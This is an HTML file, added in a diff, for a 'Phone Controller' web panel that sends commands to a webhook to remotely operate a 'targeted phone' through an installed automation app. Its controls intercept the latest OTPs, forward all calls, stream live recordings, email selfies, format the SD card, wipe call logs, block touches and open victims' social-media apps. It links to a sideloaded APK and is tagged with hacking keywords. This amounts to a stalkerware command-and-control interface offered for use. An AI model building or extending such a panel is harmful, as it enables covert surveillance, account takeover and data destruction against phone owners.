@@ -1,0 +1,1254 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+ <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css">
+<!--😐remove this popup😐-->
+   <style>
+ 
+</style>
+<!--😐remove this popup😐-->
+<script src="https://kit.fontawesome.com/72e086f493.js" crossorigin="anonymous"></script>
+<meta charset="UTF-8">
+ <meta name="author" content="Jatin singh">
+<meta name="Control mobile via one link,and use all all function of targeted phone" content="Control mobile via one link">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+<meta name="keywords" content="HTML, CSS, JavaScript, how to control phone, control, controller, one link, link, mobile controller, how to control any phone, hacking, hack, hacker, control device, device controller mobile controller">
+ <script src="jat.js"></script>
+ <link rel="stylesheet" href="jatin.css">
+ <link href="https://fonts.googleapis.com/css2?family=Montserrat+Alternates:ital,wght@0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+<!--boostrap-->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<!--boostrap-->
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phone Controller</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="Macodroid Automation example for controlling mobile device via web controller">
+  <meta name="keywords" content="WebController, MacrodroidAutomationWebController, WebControllerForAutomation, DeviceAutomationController, WebtoMobiController,full mobile controller">
+  <meta name="author" content="jatin singh">
+</head>
+
+<body id="bodyx"> 
+
+<div class="loaderweb">
+   <img src="https://i.postimg.cc/m27QhgNC/GIF-20240429-162648-532.gif">
+   </div>
+<script>
+var loader = document.querySelector(".loaderweb")
+window.addEventListener("load", getOut);
+function getOut(){
+loader.classList.add("disappear")
+}
+
+</script>
+
+<center>
+<div class="navbar" id="navbar">
+  <div class="navbar-buttons">
+    <div>
+      <img class="profile-picture" src="https://i.postimg.cc/76gGTxs0/jatin-m8-14030109-023802037.jpg" alt="Profile Picture" onclick="showFullPhoto()">
+    </div>
+    <div class="navbar-logo">
+      
+    </div>
+    <div class="dots-button" onclick="toggleDropdown()">&#8226;&#8226;&#8226;
+      <div id="dropdown-content" class="dropdown-content">
+        <a href="https://www.mediafire.com/file/ncl8ubyke7saf4u/Phone_Controller.apk/file">Download Phone_Control App</a>
+<a href="https://modyolo.com/download/macrodroid-28217/1">Download Access <br>App</a>
+        <a href="#">Link 3</a>
+      </div>
+    </div>
+  </div>
+</div>
+<div id="overlay" class="overlay">
+  <span class="close-button" onclick="closeOverlay()">X</span>
+  <img class="overlay-image" src="" alt="Profile Picture">
+</div>
+</center>
+<center>
+  <h1><!--Phone Controller</h1>--></center>
+<center>  <div class="notice">
+        <h2>📌 Importent Msg 📌</h2>
+        <p>Whatever problems and unnecessary features are currently being faced in this app, our team will fix them soon and at the same time you will also get many new future and advanced settings 🤩 thankyou...</p>
+        </div></center>
+     <div class="boxcon">
+    <span class="title">Touch Actions Via </span>
+<span style="color:white;font-weight: bold;">Select Method: </span>
+<input type="button" value="X,Y" class="xy selected">
+    <input type="button" value="Text" class="text">
+    <input type="button" value="View Id" class="id">
+    <input type="button" value="Gesture" class="gesture"><br><br>
+  <section id="xy">
+    <label>X Location: </label>
+    <input type="text" class="boxinput" id="X" placeholder="Ex = 364">
+    <label>Y Location: </label>
+    <input type="text" class="boxinput" id="Y" placeholder="Ex = 934">
+    <button class="Testsend" onclick="cmd();senddata('?X='+val('X')+'&Y='+val('Y'));">Send</button>
+  </section>
+  <section id="text">
+    <label>Text: </label>
+    <input type="text" class="boxinput" id="txt">
+    <button class="Testsend" onclick="cmd();senddata('?text='+val('txt'));">Send</button>
+  </section>
+  <section id="id">
+    <label>View Id: </label>
+    <input type="text" class="boxinput" id="idval">
+    <button class="Testsend" onclick="cmd();senddata('?id='+val('idval')+'&subject='+val('subject'));">Send</button>
+  </section>
+  <section id="gesture">
+    <label>SX: </label>
+    <input type="text"class="boxinput" id="SX" placeholder="Ex = 345">
+    <label>SY: </label>
+ <input type="text"class="boxinput" id="SY" placeholder="Ex = 1524">
+    <label>EX: </label>
+    <input type="text"class="boxinput" id="EX" placeholder="Ex =">
+    <label>EY: </label>
+    <input type="text"class="boxinput" id="EY" placeholder="Ex =">
+    
+<button class="Testsend" onclick="cmd(); senddata('?SX='+val('SX')+'&SY='+val('SY')+'&EX='+val('EX')+'&EY='+val('EY'));">Send</button>
+  </section>
+  </div>
+
+<!--FOR POPUP CODE-->
+<div class="backoverlay" id="backoverlay"></div>
+<div class="waiting" id="waiting">
+    <div id="progCon" class="prog-con">
+        <div id="progBar" class="prog-bar">0%</div>
+    </div>
+    <div id="progText" class="otptext"> Otp receiving 0/100%</div>
+</div>
+
+<!--FOR POPUP CODE-->
+
+  <div class="boxcon">
+    <span class="title">Display Dialog</span>
+    <label>Title : </label>
+    <input type="text" class="boxinput" id="ttl" placeholder="Ex = Heading">
+    <label>Description : </label>
+    <input type="text" class="boxinput" id="desc" placeholder="Ex = Your  Message">
+    <button class="Testsend" onclick="cmd();senddata('?ttl='+val('ttl')+'&msg='+val('desc')+'&Tempvar=message');">Send</button>
+  </div>
+
+<div class="boxcon">
+    <span class="title">Speak Something</span>
+    <label>Text : </label>
+    <input type="text" class="boxinput" id="speak" placeholder="Ex = Hello Jatin">
+    <button class="Testsend" onclick="cmd();senddata('?speak='+val('speak')+'&Tempvar=speak88');">Send</button>
+  </div>
+
+  <!--😎😎SEND POPUUP MESSAGE😎😎-->
+<div class="boxcon">
+    <span class="title">Popup Message (toast)</span>
+    <label>Text : </label>
+    <input type="text" class="boxinput" id="shortmsg" placeholder="Ex = Hello Dear &#128075;">      
+    <button class="Testsend" onclick="cmd();senddata('?shortmsg='+val('shortmsg')+'&Tempvar=shortmsg');">Send</button>
+  </div>
+<!--😎😎SEND POPUUP MESSAGE😎😎-->   
+
+
+  
+  <div class="boxcon">
+    <span class="title">Show Notification</span>
+    <label>Title : </label>
+    <input type="text" class="boxinput" id="ttln" placeholder="Ex = Heading">
+    <label>Description : </label>
+    <input type="text" class="boxinput"  id="descn" placeholder="Ex = Your  Message">
+    <button class="Testsend" onclick="cmd();senddata('?ttl='+val('ttln')+'&msg='+val('descn')+'&Tempvar=notimessage');">Send</button>
+  </div>
+
+  <div class="boxcon">
+    <span class="title">Play Any Your Link like : yt,<br> insta, web link & more</span>
+    <label>Paste : </label>
+    <input type="text" class="boxinput" id="speakk" placeholder="Ex = Paste link you want to play">
+     <button class="Testsend" onclick="cmd();senddata('?speak='+val('speakk')+'&Tempvar=speak');">Send</button>
+  </div>
+
+  <!--❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️--> 
+  <div class="boxcon">
+    <span class="title">Floating Text</span>
+    <label>Text : </label>
+    <input type="text" class="boxinput" id="ftext" placeholder="Ex = Hey i am hacker">         
+    <button class="Testsend" onclick="cmd();senddata('?ftext='+val('ftext')+'&Tempvar=floaton');">Send</button>
+
+    <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=floatoff');">Disable Floating Text</button>  
+  </div>
+
+<div class="boxcon">
+    <span class="title">Receive Last Photo On Gmail</span>
+    <label>Gmail : </label>
+    <input type="email" class="boxinput" id="gmail" placeholder="Ex = jatin123@gmail.com">         
+    <button class="Testsend" onclick="cmd();senddata('?gmail='+val('gmail')+'&Tempvar=gmailok');">Done</button>
+
+    <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=takephoto');">Take Selfie</button>  
+  </div>
+
+
+<!--😎😎SEND GMAIL DATA😎😎-->
+<div class="boxcon">
+<span class="title">All Calls Receive & Stop for permanent/every call</span>
+    <label>Mobile Number : </label>
+   <input type="text" class="boxinput" id="mobilenum" placeholder="Enter Your 10 Digit Number">     
+    <button class="Testsend" onclick="cmd();senddata('?mobilenum='+val('mobilenum')+'&Tempvar=callfrwdw');">Receive All Calls</button>
+
+ <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=Stopfrwd');">Stop All Calls</button>  
+  </div>
+<!--😎😎SEND GMAIL DATA😎😎-->
+    
+
+     <!--📴📴SEND LETEST OTP📴📴-->
+<div class="boxcon">
+    <span class="title">Receive Letest Otp</span>
+    <label>Mobile Number : </label>
+ <input type="text" class="boxinput" id="otp" placeholder="Enter Your 10 Digit Number"> 
+    <button class="Testsend wait" onclick="cmd();senddata('?otp='+val('otp')+'&Tempvar=letestotp');">Receive OTP</button>
+
+<button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=clearnototo');">Clear Previous OTPs</button>  
+  </div>
+<!--📴📴SEND LETEST OTP📴📴📴-->  
+
+  <div class="boxcon">
+    <span class="title">Paste Text</span>
+    <label>Text: </label>
+    <input type="text" class="boxinput" id="paste" placeholder="Ex = Who Are You Dear &#128517;">
+    <button class="Testsend" onclick="cmd();senddata('?paste='+val('paste'));">Send</button>
+    <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?paste=clrscr');">Clear Input Field</button>
+  </div> 
+
+  <div class="boxcon">
+    <span class="title">DIM Screen</span>
+    <label>Input (0-100) : </label>
+    <input type="text" class="boxinput" id="dim" placeholder="Ex = 50">
+    <button class="Testsend" onclick="cmd();senddata('?DIM='+val('dim'));">Send</button>
+    <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=dimoff');">Dim Screen Off</button>
+  </div>
+
+
+<!--❓❓❓❓❓❓❓❓❓❓❓❓-->
+
+<!--❓❓❓❓❓❓❓❓❓❓❓-->
+    <!--😎😎SEND GMAIL DATA😎😎-->
+<div class="boxcon">
+    <span class="title">Listen To Live Recording / call any one</span>
+    <label>Mobile Number : </label>
+    <input type="text" class="boxinput" placeholder="Enter Your  10 Digit Number" id="livercrd">      
+    
+<button class="Testsend" onclick="cmd();senddata('?livercrd='+val('livercrd')+'&Tempvar=playrcord');">Enable</button>
+
+ <button class="Testsend" style="margin: 5px;display: inline;" onclick="cmd();senddata('?Tempvar=stoprcrd');">Stop Recording</button>  
+  </div>
+<!--😎😎SEND GMAIL DATA😎😎-->   
+
+  <div class="boxcon">
+    <span class="title">Control Brightness</span>
+    <label>Input (0-100) : </label>
+    <input type="text" class="boxinput" id="brts" placeholder="Ex = 50">
+    <button class="Testsend" onclick="cmd();senddata('?brightness='+val('brts')+'&Tempvar=bright');">Send</button>
+  </div>
+
+  <div class="boxcon">
+    <div id="simplevar">
+      <span class="title">Variable Control</span>
+      <label>Var Name : </label>
+      <input type="text" class="boxinput" id="varname" placeholder="Ex = Varival">
+      <label>Var Value : </label>
+      <input type="text" class="boxinput" id="varvalue" placeholder="Ex = Value">
+      <button class="Testsend" onclick="cmd();senddata('?'+val('varname')+'='+val('varvalue'));">Send</button>
+
+      <button class="Testsend" style="margin: 5px;display: inline;" id="advanced">Advanced Mode (Multi Var)</button>
+    </div>
+    <div id="advancedvar">
+      <span class="title">Advanced Variable Control</span>
+      <label>Input : </label>
+      <input type="text" class="boxinput" id="parameters" placeholder="Ex = intparam=13&strparam&boolparam=false">
+      
+      <button class="Testsend" onclick="cmd(); senddata('?'+val('parameters'));">Send</button>
+      <button class="Testsend" style="margin: 5px;display: inline;" id="simple">Go To Normal Mode</button>
+    </div>
+  </div>
+</div>
+  <div>
+    <table>
+<center>
+<h1 class="Multiple">Multiple Quick Button</h1>
+<div class="ii" id="pp">Command Send &#x1F680</div>
+</center>
+
+<center>
+      <td>
+<span id="bhai" onclick="cmd();senddata('?text=RECENT');">Recent</span></td>
+      </td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?text=HOME');">Home</span></td>
+
+<td><span id="bhai" onclick="cmd();senddata('?text=BACK');">Back</span></td>
+</tr>
+ <td><span id="bhai" onclick="cmd();senddata('?Tempvar=vlm00');">valume 0%</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=vlm100');">Volume 100%</span></td>
+
+        <td>
+<span id="bhai" onclick="showPopup('popup9')">Custom volume</span>
+       </td>
+      </tr>
+<td>
+
+</td>
+    <td>
+
+        </td>
+</tr>
+      <td><span id="bhai" onclick="cmd();senddata('?Tempvar=dndon');">dnd on</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=dndoff');">dnd off</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=free');">free tap</span></td>
+<tr>
+        <td><span class="disabled" id="bhai" onclick="cmd();senddata('?text=wifion');">wifi on</span></td>
+     
+      <td>
+       <span class="disabled" id="bhai" onclick="cmd();senddata('?text=wifioff');">wifi off</span>
+         </td>
+
+
+      <td><span id="bhai" onclick="cmd();senddata('?Tempvar=free');">free</span></td>
+</tr>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=htspton');">Hotspot on</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=htsptoff');">Hotspot off</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=free');">FREE TAB</span></td>
+
+      </tr>
+      <td><span id="bhai" onclick="cmd();senddata('?text=blton');">blutooth on</span></td>
+
+<td><span id="bhai" onclick="cmd();senddata('?text=bltoff');">blutooth off</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?zoxipro=free');">FREE TAB</span></td>
+</tr>
+
+        <td><span id="bhai" onclick="cmd();senddata('?zoxipro=trchon');">torch on</span></td>
+
+
+        <td><span id="bhai" onclick="cmd();senddata('?zoxipro=trchoff');">torch off</span></td>
+       
+     <td><span id="bhai" onclick="showPopup('popup10')">torch  blink</span></td>
+</tr>
+
+        <td><span id="bhai" onclick="cmd();senddata('?zoxipro=free');">free tap</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?zoxipro=free');">free tap</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=takephoto');">Take Selfie</span></td>
+</tr>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=screenon');">screen on</span></td>
+      
+      
+    <td><span id="bhai" onclick="cmd();senddata('?Tempvar=screenoff');">screen off</span></td>
+
+<td><span id="bhai" onclick="showPopup('popup8')">screen blinking</span></td>
+</tr>
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=sdformat');">format sd card</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=powerx');">Restart/reboot</span></td>
+
+
+        <td>
+<span id="bhai" onclick="cmd();senddata('?Tempvar=switchoff');">Switch off</span>
+       </td>
+      </tr>
+      <tr>
+
+</tr>
+      
+        <td><span id="bhai" onclick="cmd();senddata('?text=ENOTIBAR');">Expand Notification</span></td>
+   
+     <td><span id="bhai" onclick="cmd();senddata('?text=CNOTIBAR');">Back Notification</span></td>
+
+        <td><span id="bhai" onclick="cmd();senddata('?Tempvar=alarm');">Alarm At Full Volume</span></td>
+</tr>
+     <td><span id="bhai" onclick="cmd();senddata('?Option=fliteon');">flight mode on</span></td>
+
+<td><span id="bhai" onclick="cmd();senddata('?Option=fliteoff');">flight mode off</span></td>
+
+<td><span id="bhai" onclick="cmd();senddata('?Tempvar=scnsot');">Screenshot</span></td>
+        </center>
+   </div>
+   </table>
+  </div>
+
+<!--Advance☎️Hack☎️Cheats☎️Code-->
+<h3 class="Multiple">Advance Hack Cheats Codes</h3>
+  <!-- Popup Background -->
+<div class="come-shad" id="come-shad">
+    <!-- Popup Content -->
+    <div class="pp-content">
+        <div class="cs-cs" onclick="closePopup()">&#10005;</div>
+        <center>
+            <h2 id="popup-heading"></h2>
+            <img class="kaayi" src="" alt="VB" id="kaayi">
+            <!-- Slider buttons -->
+            <br>
+            <div class="sld-sld" id="prev-button">&#10094; Back</div>
+            <div class="sld-sld2" id="next-button">Next &#10095;</div>
+   </div>
+</div>
+</center>
+
+<center>
+<!--📵📵 CALL CONFIGURE NUMBER 📵📵-->
+ 
+<div class="ggg pp-pp onclick="cmd();senddata('?Tempvar=lastnum');">Temporary disabled</div>
+  
+<div class="ggg pp-pp disabled>Temporary disabled</div>
+<br>
+<div class="ggg pp-pp disabled>Temporary disabled</div>
+       
+ <div class="ggg pp-pp disabled>Temporary disabled</div>
+<br>
+<!--📵📵 CALL CONFIGURE NUMBER 📵📵-->
+
+<!-- Div buttons to trigger the popup -->
+        <div class="ggg pp-pp disabled" data-heading="&#128071; Your Code Is &#128071;M8in1KmT2VJik">Temporary disabled</div>
+        <div class="ggg pp-pp disabled" data-heading="&#128071; Your Code Is &#128071;  M8a16JcSQuWNy">Temporary disabled</div><br>
+        <div class="ggg pp-pp disabled" data-heading="&#128071; Your Code Is &#128071;  M8bN0mFu0QyBw">Temporary disabled</div>
+        <div class="ggg pp-pp disabled" data-heading="&#128071; Your Code Is &#128071;  M8xq17E7mRFVh">Temporary disabled</div>
+</center>
+
+<script>
+    var images = [
+        [
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIrhO106Vcyau9y6DQ85zet50qugG69xCqg&usqp=CAU",
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfkYcRRAYT5MO1qkvzNsubcdaSzWZaobRLBw&usqp=CAU",
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaRztWPKYx12l234JL_H_ol-q9DgG7U_4pamPrvytK_A&s"
+        ],
+        [
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIrhO106Vcyau9y6DQ85zet50qugG69xCqg&usqp=CAU",
+            "https://i.postimg.cc/5ytcPbT7/IMG-20240318-WA0003.jpg",
+            "https://i.postimg.cc/5ytcPbT7/IMG-20240318-WA0003.jpg"
+        ],
+        [
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIrhO106Vcyau9y6DQ85zet50qugG69xCqg&usqp=CAU",
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfkYcRRAYT5MO1qkvzNsubcdaSzWZaobRLBw&usqp=CAU",
+            "https://i.postimg.cc/5ytcPbT7/IMG-20240318-WA0003.jpg"
+        ],
+        [
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIrhO106Vcyau9y6DQ85zet50qugG69xCqg&usqp=CAU",
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfkYcRRAYT5MO1qkvzNsubcdaSzWZaobRLBw&usqp=CAU",
+            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaRztWPKYx12l234JL_H_ol-q9DgG7U_4pamPrvytK_A&s"
+        ]
+    ];
+
+    var currentIndex = 0;
+
+    function updatePopupImage() {
+        var kaayi = document.getElementById("kaayi");
+        kaayi.src = images[currentIndex[0]][currentIndex[1]];
+        document.getElementById("popup-heading").textContent = document.querySelectorAll('.ggg.pp-pp')[currentIndex[0]].getAttribute('data-heading');
+    }
+
+    var popupButtons = document.querySelectorAll(".pp-pp");
+
+    popupButtons.forEach(function(button, index) {
+        button.addEventListener("click", function() {
+            var popupBackground = document.getElementById("come-shad");
+            popupBackground.style.display = "flex";
+            currentIndex = [index, 0];
+            updatePopupImage();
+        });
+    });
+
+    document.getElementById("prev-button").addEventListener("click", function() {
+        currentIndex[1] = (currentIndex[1] - 1 + images[currentIndex[0]].length) % images[currentIndex[0]].length;
+        updatePopupImage();
+    });
+
+    function closePopup() {
+        var popupBackground = document.getElementById("come-shad");
+        popupBackground.style.display
+        ="none";
+}
+
+    
+</script>
+<br>
+<!--Advance☝️Hack☎️Cheats☝️Code-->
+    <form id="linkbase" method="POST">
+        <div id="openModal" class="modalDialog">
+      <div>
+        <h2>Enter Your Webhook URL Below: </h2>
+       
+      Link : <input type="text" class="boxinput web" id="webhookurl" name="TargetsLinks" placeholder="Paste Yout Link Here...">
+        
+    <p><span id="multiple">Developer:</span> <span class="heart">&#10084;</span> From Mr Jatin <a href="https://www.instagram.com/jatin_m8/"><ion-icon name="logo-instagram"></ion-icon></a></p><span id="warning"></span>
+    
+    <input type="submit" id="websaver" value="Submit">
+      </div>
+    </div>
+<br>
+  <p class="Multiple"> Multiple Dropdown  Button</p>
+
+   <!--❤️❤️❤️❤️-->
+
+<table>
+<center>
+<div class="disable">
+
+<div class="dropPP">
+
+<button class="multibttn">Snapchat Pages <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+ 
+<a onclick="cmd();senddata('?Pages=snpmap')">Map</a>
+ 
+<a onclick="cmd();senddata('?Pages=snpchats')">Chats</a>
+ 
+<a onclick="cmd();senddata('?Pages=snpstory')">Story</a>
+
+<a onclick="cmd();senddata('?Pages=snpspot')">Spotlight</a>
+
+</div>
+</div>
+
+<div class="dropPP">
+
+<button class="multibttn">Instagram Pages <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+ 
+<a onclick="cmd();senddata('?Pages=igexplore')">Explore</a>
+<a onclick="cmd(); senddata('?Pages=igcamera');">Camera</a>
+<a onclick="cmd(); senddata('?Pages=igreel');">Reels</a>
+<a onclick="cmd();senddata('?Pages=igpost')">Post</a>
+<a onclick="senddata('?Pages=igdirect')">Message</a>
+<a onclick="cmd();senddata('?Pages=ignotific')">Notification</a>
+<a onclick="cmd();senddata('?Pages=igprofile')">User profile</a>
+<a onclick="showPopup('popup7')">Profile by searching</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">Facebook Pages <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+      <a onclick="cmd();senddata('?Pages=group')">Group</a>
+<a onclick="cmd();senddata('?Pages=fbvideo')">whatch</a>
+
+<a onclick="cmd();senddata('?Pages=fbfriend')">Friends</a>
+
+<a onclick="cmd();senddata('?Pages=fbevents')">Invents</a>
+
+<a onclick="cmd();senddata('?Pages=fbnotific')">Notification</a>
+
+<a onclick="cmd();senddata('?Pages=fbprofile')">Profile</a>
+
+<a onclick="cmd();senddata('?Pages=fbrequests')">Requests</a>
+
+</div></div>
+
+<br>
+<div class="dropPP">
+
+<button class="multibttn">WhatsApp Pages <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="cmd();senddata('?Pages=wpcamera')">WhatsApp camera</a>
+
+ <a onclick="cmd();senddata('?Pages=wpchat')">WhatsApp chats</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">YouTube Pages <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="cmd();senddata('?Pages=history')">History</a>
+<a onclick="cmd();senddata('?Pages=library')">Library</a>
+<a onclick="cmd();senddata('?Pages=subs')">Subscription</a>
+<a onclick="cmd();senddata('?Pages=trend')">Trending</a>
+<a onclick="cmd();senddata('?Pages=watch')">whatch</a>
+<a onclick="cmd();senddata('?Pages=ytshort')">Short  videos</a>
+<a onclick="cmd();senddata('?Pages=ytexplo')">Explore</a>
+<a onclick="cmd();senddata('?Pages=ytsearch')">Search videos</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">clear call log <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="cmd();senddata('?Tempvar=clearinco')">clear incoming calls</a>
+ 
+<a onclick="cmd();senddata('?Tempvar=clearout')">clear outgoing calls</a>
+
+<a onclick="cmd();senddata('?Tempvar=clearall')">clear all calls</a>
+<a onclick="cmd();senddata('?Tempvar=clearrej')">clear rejected calls</a>
+<a onclick="cmd();senddata('?Tempvar=clearmis')">clear missed calls</a>
+<a onclick="cmd();senddata('?Tempvar=clearblk')">clear blocked calls</a>
+
+</div></div><br>
+<div class="dropPP">
+
+<button class="multibttn">coming soon <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+</div>
+</div>
+
+<br>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+
+<br>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<div class="dropPP">
+
+<button class="multibttn">coming soon  <i class="fa fa-caret-down"></i></button>
+
+<div class="down">
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+ 
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+<a onclick="senddata('?Tempvar=free')">Option</a>
+
+</div></div>
+<br>
+<h1 class="Multiple">function coming soon<h1>
+
+
+<div class="perentA">
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=callans');"><i class="fa-solid fa-phone fa-beat-fade"></i>call receive</div>         
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=callreject');"><i class="fa-solid fa-phone fa-beat-fade"></i>call reject</div>         
+<br>
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=scnblock');"><i class="fa-solid fa-lock fa-beat-fade"></i>block touches</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=scnunblock');"><i class="fa-solid fa-lock-open fa-beat-fade"></i>unblock touches</div>     
+   <br> 
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=silent');"><i class="fa-solid fa-bell-slash fa-beat-fade"></i>silent mode</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=ringer');"><i class="fa-solid fa-bell fa-beat-fade"></i>ringer mode</div>         
+<br>
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=rotpot');"><i class="fa-solid fa-image-portrait fa-beat-fade"></i>rotation portrait</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=rotlan');"><i class="fa-duotone fa-image-landscape fa-beat-fade"></i>rotation landscape</div>     
+    <br>
+<div class="ggg b11" onclick="cmd();showPopup('popup11')"> <i class="fa-solid fa-phone fa-beat-fade"></i>Call Any One</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Tempvar=lastnum');"><i class="fa-solid fa-phone fa-beat-fade"></i>call on last number</div>         
+<br>
+<div class="ggg b11" onclick="cmd();senddata('?Forgszr=up');"><i class="fa-solid fa-up-long fa-beat-fade"></i>   Up slider</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Forgszr=down');"> <i class="fa-solid fa-down-long fa-beat-fade"></i>down slider</div>     
+   <br> 
+<div class="ggg b11" onclick="cmd();senddata('?Forgszr=left');"><i class="fa-solid fa-left-long fa-beat-fade"></i>left slider</div> 
+
+<div class="ggg b11" onclick="cmd();senddata('?Forgszr=right');"><i class="fa-solid fa-right-long fa-beat-fade"></i>right slider</div>   
+</div>      
+
+
+
+<div class="xperent">
+
+<div class="ggg b11 disable" onclick="cmd();senddata('?Tempvar=callans');"><i class="fa-solid fa-phone fa-beat-fade"></i>call receive</div>         
+
